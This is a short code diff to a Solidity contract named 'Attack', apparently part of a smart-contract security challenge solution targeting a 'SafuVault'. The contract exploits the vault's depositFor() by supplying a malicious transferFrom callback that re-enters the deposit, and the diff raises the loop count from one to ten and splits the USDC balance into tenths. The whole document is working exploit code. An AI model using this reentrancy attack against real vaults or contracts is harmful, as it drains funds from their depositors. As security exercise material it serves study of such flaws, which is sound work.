@@ -20,7 +20,7 @@ contract Attack {
         // get usdc balance of this contract = 10_000
         uint256 usdcBalance = usdc.balanceOf(address(this));
 
-        uint256 usdcAmount = usdcBalance / 1;
+        uint256 usdcAmount = usdcBalance / 10;
 
         // call safuVault.depositFor() making it call transferFrom from this contract
         // with usdcAmount amount for user this address
@@ -34,7 +34,7 @@ contract Attack {
 
     // gets called after depositFor() in startAttack()
     function transferFrom(address from, address to, uint256 amount) external {
-        if (loops < 1) {
+        if (loops < 10) {
             loops++;
 
             // transfer ammount = usdcAmount to the msg.sender = SafuVault
